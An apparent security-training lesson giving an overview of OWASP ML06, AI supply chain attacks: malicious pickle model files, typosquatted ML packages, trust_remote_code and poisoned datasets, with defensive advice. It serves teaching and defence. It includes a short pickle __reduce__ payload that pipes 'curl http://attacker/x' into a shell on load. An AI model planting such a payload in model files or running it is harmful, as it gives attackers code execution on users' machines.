# ML06: AI Supply Chain Attacks - Overview

## Table of Contents
- [What Are AI Supply Chain Attacks?](#what-are-ai-supply-chain-attacks)
- [Why Does This Matter?](#why-does-this-matter)
- [Technical Context](#technical-context)
- [Real-World Impact](#real-world-impact)
- [Prevalence and Statistics](#prevalence-and-statistics)
- [Common Misunderstandings](#common-misunderstandings)

## What Are AI Supply Chain Attacks?

An **AI Supply Chain Attack** is the compromise of any third-party component that flows into a machine-learning system: a pretrained model pulled from a hub, a public dataset, an ML library or framework, or the MLOps tooling that ties them together. Instead of attacking your trained model directly, the adversary poisons an *ingredient* you trust and let into your pipeline—so the compromise arrives pre-installed.

Modern ML is assembled almost entirely from parts you did not build. A typical training or inference stack downloads weights from Hugging Face, datasets from public mirrors, dozens of pip packages (PyTorch, TensorFlow, transformers, scikit-learn, NumPy), and a chain of MLOps services for experiment tracking, serving, and orchestration. Every one of those is code and data authored by someone else, fetched over the network, and often executed the moment it loads. ML06 is what happens when one of those links is malicious, backdoored, or tampered with.

> **Framing:** ML06 is the classic-ML sibling of **LLM03: Supply Chain** (OWASP LLM Top 10) and **K02: Supply Chain Vulnerabilities** (OWASP ML/Kubernetes-adjacent lists). This lesson keeps the *machine-learning* framing—models, datasets, frameworks, and tooling—rather than the LLM-application framing.

### Core Concept

```
Trusted ML Supply Chain:
  Pretrained model -> from a verified publisher, integrity-checked, scanned
  Serialization    -> safetensors (data-only), never arbitrary-code formats
  Dataset          -> provenance recorded, checksums pinned, source vetted
  ML packages      -> pinned versions + hashes, from a trusted index/mirror
  Frameworks       -> patched, digests pinned, SBOM/AI-BOM maintained
  remote code      -> trust_remote_code disabled for untrusted repos
  Loading          -> sandboxed, least-privilege, monitored

Compromised ML Supply Chain:
  Pretrained model -> backdoored weights or a pickle that runs code on load
  Serialization    -> pickle / torch.load / joblib / Keras Lambda = RCE
  Dataset          -> poisoned samples / hidden triggers baked into training
  ML packages      -> typosquatted or backdoored pip package pulls a payload
  Frameworks       -> compromised dependency or tampered weights in transit
  remote code      -> trust_remote_code=True executes attacker Python
  Loading          -> model deserialized with full process privileges
```

### Why It's Critical for ML Systems

ML pipelines concentrate several conditions that make supply-chain compromise especially damaging:

- They **execute third-party artifacts by default**. Loading a model is not passive: several common serialization formats run arbitrary code the instant you deserialize them.
- They **pull from open, low-friction hubs**. Anyone can publish a model or dataset under a plausible name, and a single line of code fetches and runs it.
- They **trust weights as opaque binaries**. A backdoored model behaves normally on ordinary inputs and only misbehaves on a hidden trigger—so testing rarely catches it.
- They **run with broad privileges**. Training and serving nodes typically hold cloud credentials, data-store access, and GPU fleets—an attractive target once code runs.
- They **have long, opaque dependency trees**. A compromise three levels deep in a transitive ML dependency is invisible to anyone reading the top-level requirements.

## Why Does This Matter?

### Business Impact

- **Pipeline Compromise / RCE**: A malicious model or package that runs code on load hands the attacker execution on your training or serving infrastructure—often with cloud credentials attached.
- **Sabotaged Models**: A backdoored pretrained model or poisoned dataset produces a system that passes evaluation yet fails—or is attacker-controllable—on specific triggers in production.
- **Data and Secret Theft**: Code executing during model load can exfiltrate training data, API keys, and model weights (your own intellectual property).
- **Downstream Blast Radius**: A single compromised base model or shared package propagates to every team and product that fine-tuned or depended on it.
- **Compliance and Trust**: Shipping a product built on an unvetted, backdoored component undermines regulatory attestations and customer trust once discovered.

### Technical Impact

- **Arbitrary Code Execution on Load**: `pickle`, `torch.load` (which uses pickle), `joblib`, and Keras `Lambda` layers can all execute attacker code during deserialization.
- **Hidden Backdoors in Weights**: Trigger-based behavior survives fine-tuning and is invisible to standard accuracy metrics.
- **Poisoned Training Signal**: Tampered public datasets embed bias, triggers, or degraded performance directly into every model trained on them.
- **Dependency Confusion / Typosquatting**: A malicious `torchvison` or `tensorfow` package installs a payload before a single line of your code runs.
- **Tampering in Transit or Storage**: Weights altered on a mirror, CDN, or object store arrive corrupted or backdoored despite a legitimate original.

## Technical Context

### The ML Supply Chain, Component by Component

| Component | Where It Comes From | How It Gets Compromised |
|-----------|--------------------|------------------------|
| Pretrained models / weights | Hugging Face, model zoos, vendor downloads | Backdoored weights, malicious pickle, tampered files |
| Datasets | Public corpora, scraped web data, shared buckets | Poisoned samples, hidden triggers, label flips |
| ML libraries / frameworks | PyPI, conda, framework releases | Typosquatting, dependency confusion, backdoored release |
| Model-loading code | Repo `modeling_*.py` via `trust_remote_code` | Arbitrary Python executed on `from_pretrained` |
| MLOps tooling | Trackers, registries, serving, pipelines | Vulnerable/unauthenticated services, compromised images |
| Transport & storage | CDNs, mirrors, object stores | Tampering in transit, mutable "latest" tags |

### 1. Unsafe Model Deserialization (Code Execution on Load)

The most direct ML06 vector: several formats used to save models are not just data—they are programs. Python's `pickle` can reconstruct arbitrary objects, which means it can run arbitrary code. `torch.load`, `joblib.load`, and unpickled scikit-learn models all inherit this.

```python
# A malicious .bin / .pt / .pkl can carry this:
class Payload:
    def __reduce__(self):
        import os
        return (os.system, ("curl http://attacker/x | sh",))
# torch.load(untrusted_file)  ->  the command runs BEFORE you use the model
```

**Risk**: downloading a "helpful" pretrained model and calling `torch.load` on it executes the attacker's code with your privileges.

### 2. Backdoored / Malicious Pretrained Models from Hubs

```python
from transformers import AutoModel
# Looks legitimate; the repo name squats on a popular model:
model = AutoModel.from_pretrained("populer-org/bert-base")   # typo'd namespace
```

**Risk**: either the weights carry a hidden trigger, or the repo ships a malicious loader that runs on import.

### 3. `trust_remote_code` Executing Repo Python

```python
# The repo ships modeling_custom.py; this flag runs it on your machine:
model = AutoModel.from_pretrained("some/repo", trust_remote_code=True)
```

**Risk**: `trust_remote_code=True` against an untrusted repo is remote code execution by design—the repo's Python runs during load.

### 4. Poisoned Public Datasets

```python
# Pulling a community dataset with no integrity or provenance check:
ds = load_dataset("community/scraped-images")   # who curated this? unknown
```

**Risk**: an attacker who edits a public dataset injects triggers or biased samples that end up baked into your trained model.

### 5. Typosquatted / Backdoored ML Packages

```
pip install torchvison        # not torchvision
pip install tensorfow         # not tensorflow
pip install sklern            # not scikit-learn / sklearn
```

**Risk**: the malicious package's install script or import runs a payload before your training code even starts.

## Real-World Impact

The examples below are described as **incident classes** that are well documented in the security research literature. They are patterns, not specific CVE numbers.

### Case Class 1: Malicious Models on Public Hubs

**Pattern**:

- Security researchers have repeatedly scanned public model hubs (notably Hugging Face) and found models whose serialized files contained embedded pickle payloads that execute code on load.
- Because `pytorch_model.bin` and similar files are pickle under the hood, a model that "just works" can carry a reverse shell or credential stealer that fires the moment it is deserialized.

**Impact**: any user who downloaded and loaded such a model ran attacker code with their own privileges. This class of finding drove hubs to add automated pickle scanning and to promote the safetensors format.

**Root Cause**: treating a downloaded model as inert data when the serialization format is actually executable.

### Case Class 2: Pickle / Deserialization RCE Research

**Pattern**:

- A long line of published research demonstrates crafting model files (`pickle`, `torch.load`, `joblib`, Keras `Lambda` layers) that run arbitrary code purely by being loaded.
- Tools such as `picklescan` and ModelScan exist specifically because this is a general, format-level problem—not a bug in one library.

**Impact**: proof that "load this model" is equivalent to "run this program" for these formats, motivating the shift to data-only serialization.

**Root Cause**: serialization formats that permit arbitrary object reconstruction, combined with loading untrusted files.

### Case Class 3: Typosquatted ML Packages on Public Registries

**Pattern**:

- Malicious packages have repeatedly been published to PyPI (and other registries) using names that typo-squat popular ML libraries, or that exploit dependency confusion against internal package names.
- Install-time or import-time code exfiltrates environment variables, cloud credentials, or SSH keys—or installs a backdoor.

**Impact**: developers who mistyped a dependency, or whose resolver preferred a public package over an internal one, executed attacker code in their build and dev environments.

**Root Cause**: unpinned, unverified dependencies resolved from an open index without name/provenance controls.

## Prevalence and Statistics

AI supply-chain risk is consistently rated **high and rising** across ML security guidance, because it inherits the entire software-supply-chain problem *and* adds ML-specific formats (executable model files) and artifacts (weights, datasets) on top.

Rather than cite precise counts (which vary by source and year), the defensible picture is:

- Unsafe model deserialization is **widespread and easy to demonstrate**—the default save/load formats for the most popular frameworks are code-executing.
- Public hubs host **enormous numbers of community models and datasets** with minimal provenance guarantees, and scanners routinely surface malicious ones.
- Typosquatting and dependency confusion against ML package names are **recurring, not one-off** events on public registries.
- Impact ranges from **info disclosure to full remote code execution** on training/serving infrastructure, up to **silent model sabotage** via backdoors and poisoning.

> Note: exact figures differ between reports. Treat any single number as illustrative; the durable takeaway is that the ML supply chain is broad, largely unvetted, and frequently executable—so a compromised ingredient is a realistic and repeatedly observed threat.

## Common Misunderstandings

### Myth 1: "Loading a model is just reading data"
**Reality**: For `pickle`, `torch.load`, `joblib`, and Keras `Lambda` layers, loading a model can execute arbitrary code. Prefer safetensors, which is data-only, for exactly this reason.

### Myth 2: "It came from a popular hub, so it's safe"
**Reality**: Hubs are open publishing platforms. A plausible name and a good README are not provenance. Verify the publisher, check integrity, and scan the artifact before loading.

### Myth 3: "The model passed our accuracy tests, so it's clean"
**Reality**: A backdoor is designed to be invisible on normal inputs and to fire only on a hidden trigger. Standard evaluation will not reveal it.

### Myth 4: "We pinned our direct dependencies, so the tree is safe"
**Reality**: Transitive dependencies and mutable "latest" model tags reintroduce risk. Pin with hashes/digests all the way down and maintain an SBOM/AI-BOM.

### Myth 5: "trust_remote_code is a normal convenience flag"
**Reality**: `trust_remote_code=True` runs the repo's Python on your machine. Enabling it for an untrusted repo is remote code execution by design.

### Myth 6: "This is the same as classic app supply chain, nothing new"
**Reality**: ML adds two novel wrinkles—*executable model artifacts* and *poisonable training data/weights*—that ordinary SCA and app hardening do not cover on their own.

## How ML06 Differs from Related Issues

| Aspect | ML06 Supply Chain | ML02 Data Poisoning | ML10 Model Poisoning |
|--------|-------------------|---------------------|----------------------|
| **Root cause** | Compromised third-party component (model/dataset/package/tool) | Attacker influences *your* training data | Attacker tampers with *your* model/weights or training process |
| **Entry point** | Anything you download and trust | Data collection / labeling pipeline | Model artifact or training update |
| **Typical fix** | Vet, pin, verify, scan, sandbox | Validate/clean data, provenance | Integrity of training + weights |
| **Detection** | SCA, model scanning, provenance/signatures | Data auditing, anomaly detection | Weight/behavior auditing |

These overlap: a poisoned *public* dataset is both ML02 and ML06, and a backdoored downloaded model straddles ML06 and ML10. ML06's defining feature is that the compromise entered through a **third-party component you imported**.

## Key Takeaways

1. **Everything you download is code or data you now trust**—models, datasets, packages, and tooling are all attack surface.
2. **Loading a model can run code**—prefer safetensors; never `pickle`/`torch.load` an untrusted file.
3. **Backdoors hide from accuracy metrics**—provenance and integrity checks catch what evaluation cannot.
4. **Pin and verify the whole tree**—typosquatting and transitive deps are where real incidents live.
5. **trust_remote_code is RCE by design**—disable it for anything you do not fully control.

## How to Identify if You're Exposed

Ask these questions about your ML pipeline:

- [ ] Do you ever call `torch.load`, `pickle.load`, or `joblib.load` on a file you did not produce?
- [ ] Do you prefer safetensors for model weights wherever the framework supports it?
- [ ] Do you verify a hash or signature for every downloaded model and dataset before use?
- [ ] Do you scan model files (picklescan/ModelScan) and dependencies (SCA) in CI?
- [ ] Are all ML dependencies pinned by version *and* hash, from a trusted index or mirror?
- [ ] Is `trust_remote_code` disabled for every untrusted repository?
- [ ] Do you record provenance (publisher, model card, source URL) for each artifact?
- [ ] Is model loading sandboxed with least privilege (no standing cloud credentials)?
- [ ] Do you maintain an SBOM/AI-BOM covering models, datasets, and packages?
- [ ] Do you monitor for unexpected network calls or file access during model load?

If you answered "no" or "not sure" to several of these, your ML supply chain is likely exploitable today.

## Next Steps

- **[Attack Vectors](attack-vectors.html)**: How attackers get a malicious model, dataset, or package into your pipeline
- **[Prevention](prevention.html)**: Vet, pin, verify, scan, and sandbox the whole ML supply chain
- **[Examples](examples.html)**: Insecure vs. secure model loading and dependency handling in Python
- **[Back to the ML Security track](/learn/ml)**
- **[Practice](/practice)**: Apply these concepts hands-on
